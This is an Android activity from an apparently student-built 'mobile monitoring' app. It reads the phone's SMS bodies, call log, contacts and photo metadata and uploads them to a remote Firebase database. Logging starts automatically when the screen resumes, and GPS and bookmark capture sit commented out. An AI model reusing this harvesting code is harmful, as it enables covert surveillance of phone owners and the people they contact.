package com.example.thanh.mobilemonitoring;

import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.firebase.client.Firebase;

import java.util.ArrayList;
import java.util.Date;

import Models.Bookmark;
import Models.Call;
import Models.Contact;
import Models.GPS;
import Models.Photo;
import Models.SMS;

public class MainActivity extends AppCompatActivity {

    TextView txtv;
    Button btnStart, btnViewLog, btnContact;
    Firebase root;
    LocationManager locationManager;
    Location location;
    StringBuffer sbCalls = new StringBuffer();
    StringBuffer sbSMSs = new StringBuffer();
    StringBuffer sbPhotos = new StringBuffer();
    StringBuffer sbContacts = new StringBuffer();
    StringBuffer sbBookmarks = new StringBuffer();
    StringBuffer sbGPS = new StringBuffer();
    public static String ref;

    ArrayList<Contact> arrayListContacts = new ArrayList<Contact>();
    ArrayList<Call> arrayListCalls= new ArrayList<Call>();
    ArrayList<Bookmark> arrayListBookmarks = new ArrayList<Bookmark>();
    ArrayList<SMS> arrayListSMSs = new ArrayList<SMS>();
    ArrayList<Photo> arrayListPhotos= new ArrayList<Photo>();


    boolean isRunning = false;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        txtv = (TextView)findViewById(R.id.textViewLogState);
        btnStart = (Button)findViewById(R.id.buttonStart);
        btnViewLog = (Button)findViewById(R.id.buttonViewLog);
        btnContact = (Button)findViewById(R.id.buttonContact);

        Firebase.setAndroidContext(this);
        Bundle receive = this.getIntent().getExtras();
        ref = receive.getString("firebase_ref");
        root = new Firebase(ref);


        btnStart.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(isRunning == false){
                    startLog();
                    isRunning = true;
                    txtv.setText("Logging is started");
                    btnStart.setText("Stop Log");
                }else{
                    isRunning = false;
                    txtv.setText("Logging is stopped");
                    btnStart.setText("Start Log");
                }

            }
        });

        btnViewLog.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(isRunning == false){
                    Toast.makeText(getApplicationContext(), "Please press button 'Start Log' !!", Toast.LENGTH_SHORT).show();
                }else {
                    Intent intent = new Intent(MainActivity.this, ViewOptions.class);
                    Bundle send = new Bundle();
                    send.putString("sCallLog", String.valueOf(sbCalls));
                    send.putString("sSMSLog", String.valueOf(sbSMSs));
                    send.putString("sContactLog", String.valueOf(sbContacts));
//                    send.putString("sBookmarkLog", String.valueOf(sbBookmarks));
                    send.putString("sPhotoLog", String.valueOf(sbPhotos));
                    intent.putExtras(send);
                    startActivity(intent);
                }
            }
        });

        btnContact.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
//                Intent intent = new Intent(getApplicationContext(), ContactView.class);
//                Bundle send = new Bundle();
//                send.putString("ref", ref);
//                intent.putExtras(send);
//                startActivity(intent);
                Intent intent = new Intent(getApplicationContext(), DisplayLocation.class);
                startActivity(intent);
            }
        });
    }

    private void startLog(){
        getSMS();
        getCalls();
//        getBookmarks();
        getContacts();
//        getGPS();
        getPhotos();
    }

    private void getSMS(){
        sbSMSs.append("*********SMS History**********");
        Uri uri = Uri.parse("content://sms");
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);

        if (cursor.moveToFirst() && cursor.getCount() > 0) {
            while (cursor.isAfterLast() == false) {
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body")).toString();
                String number = cursor.getString(cursor.getColumnIndexOrThrow("address")).toString();
                String smsDayTime = cursor.getString(cursor.getColumnIndexOrThrow("date")).toString();
                String type = cursor.getString(cursor.getColumnIndexOrThrow("type")).toString();
                String typeOfSMS = null;
                switch (Integer.parseInt(type)) {
                    case 1:
                        typeOfSMS = "INBOX";
                        break;

                    case 2:
                        typeOfSMS = "SENT";
                        break;

                    case 3:
                        typeOfSMS = "DRAFT";
                        break;
                }

                SMS sms = new SMS(number, typeOfSMS, smsDayTime, body);
                arrayListSMSs.add(sms);

                sbSMSs.append("\nPhone Number:--- " + number
                        + "\nMessage Type:--- " + typeOfSMS
                        + "\nMessage Date:--- " + smsDayTime
                        + "\nMessage Body:--- " + body
                        + "\n----------------------------------");
                cursor.moveToNext();
            }
        }
        cursor.close();
        root.child("SMSs").setValue(arrayListSMSs);
    }

    private void getCalls(){
        sbCalls.append("***********Show Calls Log**********");
        String strOrder = CallLog.Calls.DATE + " DESC";
        Cursor cursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, strOrder);

        if(cursor.moveToFirst() && cursor.getCount() > 0){
            while (cursor.isAfterLast() == false) {
                String phNum = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String callTypeCode = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                Long longDate = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                String callDate = new Date(longDate).toString();
                String callDuration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                String callType = null;
                int callcode = Integer.parseInt(callTypeCode);
                switch (callcode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        callType = "Outgoing";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        callType = "Incoming";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callType = "Missed";
                        break;
                }
                Call call = new Call(phNum, callType, callDate, callDuration);
                arrayListCalls.add(call);
//                root.child("Calls").push().setValue(call);

                sbCalls.append("\nPhone Number:--- " + phNum
                        + "\nCall Type:--- " + callType
                        + "\nCall Date:--- " + callDate
                        + "\nCall duration in sec :--- " + callDuration
                        + "\n----------------------------------");
                cursor.moveToNext();
            }
            cursor.close();
        }
        root.child("Calls").setValue(arrayListCalls);
    }

//    private void getBookmarks(){
//        sbBookmarks.append("*******Bookmarks history*******");
//        Cursor cursor = getContentResolver().query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, null, null, null);
//        if (cursor.moveToFirst() && cursor.getCount() > 0) {
//            while (cursor.isAfterLast() == false) {
//                String title = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.TITLE));
//                String url = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.URL));
//                Long strDate = cursor.getLong(cursor.getColumnIndex(Browser.BookmarkColumns.DATE));
//                String date = new Date(strDate).toString();
//
//                Bookmark bookmark = new Bookmark(title, url, date);
//                arrayListBookmarks.add(bookmark);
////                root.child("Bookmarks").push().setValue(bookmark);
//
//                sbBookmarks.append("\nTitle:--- " + title
//                        + "\nURL:--- " + url
//                        + "\nDate:--- " + date
//                        + "\n---------------------");
//                cursor.moveToNext();
//            }
//            cursor.close();
//        }
//        root.child("Bookmarks").setValue(arrayListBookmarks);
//    }

    private void getPhotos(){
        sbPhotos.append("*********Show Photos*********");
        String[] projection = {MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.DATA,
                MediaStore.MediaColumns.MIME_TYPE,
                MediaStore.MediaColumns.DATE_ADDED};

        Cursor cursor = managedQuery(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC");
        if(cursor.moveToFirst() && cursor.getCount() > 0){
            while (cursor.isAfterLast() == false){
                String fPath = cursor.getString(cursor.getColumnIndex(MediaStore.MediaColumns.DATA));
                String fName = cursor.getString(cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));
                String fMime = cursor.getString(cursor.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE));
                Long lDate = cursor.getLong(cursor.getColumnIndex(MediaStore.MediaColumns.DATE_ADDED));
                String fDate = new Date(lDate).toString();

                Photo photo = new Photo(fPath, fName, fMime, fDate);
                arrayListPhotos.add(photo);
//                root.child("Photos").push().setValue(photo);

                sbPhotos.append("\nPath:--- " + fPath
                        + "\nName:-- " + fName
                        + "\nMine:--- " + fMime
                        + "\nDate Added:--- " + fDate
                        + "\n-------------------------");
                cursor.moveToNext();
            }
            cursor.close();
        }
        root.child("Photos").setValue(arrayListPhotos);
    }


    private void getContacts() {
        sbContacts.append("**********Show Contacts***********");
        String strOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC";
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, strOrder);
        if(cursor.moveToFirst() && cursor.getCount() > 0){
            while(cursor.isAfterLast() == false){
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phNum = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                Contact contact = new Contact(name, phNum);
                arrayListContacts.add(contact);
//                root.child("Contacts").push().setValue(contact);

                sbContacts.append("\nName:--- " + name
                        + "\nPhoneNumber:--- " + phNum
                        + "\n-----------------------");
                cursor.moveToNext();
            }
            cursor.close();
        }
        root.child("Contacts").setValue(arrayListContacts);
    }

//    private void getGPS(){
//        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
//        location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
//
//        if(location == null){
//            Toast.makeText(getApplicationContext(), "Current location is not found", Toast.LENGTH_SHORT).show();
//        }else {
//            GPS gps = new GPS(location.getLatitude(), location.getLongitude());
//
//            root.child("GPSLocation").setValue(gps);
//
//            sbGPS.append("********Shows GPS Location********");
//            sbGPS.append("Your location is:"
//                    + "\nLatitude: " + location.getLatitude()
//                    + "\nLongtitude: " + location.getLongitude()
//            );
//        }
//    }
//
//
//    private LocationListener listener = new LocationListener() {
//        @Override
//        public void onLocationChanged(Location location) {
//            location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
//            GPS gps = new GPS(location.getLatitude(), location.getLongitude());
//
//            root.child("GPSLocation").setValue(gps);
//        }
//
//        @Override
//        public void onStatusChanged(String provider, int status, Bundle extras) {
//
//        }
//
//        @Override
//        public void onProviderEnabled(String provider) {
//
//        }
//
//        @Override
//        public void onProviderDisabled(String provider) {
//
//        }
//    };

    @Override
    protected void onResume() {
        super.onResume();

        if(isRunning == false){
            startLog();
            isRunning = true;
            txtv.setText("Logging is started");
            btnStart.setText("Stop Log");
        }else{
            isRunning = false;
            txtv.setText("Logging is stopped");
            btnStart.setText("Start Log");
        }
    }
}
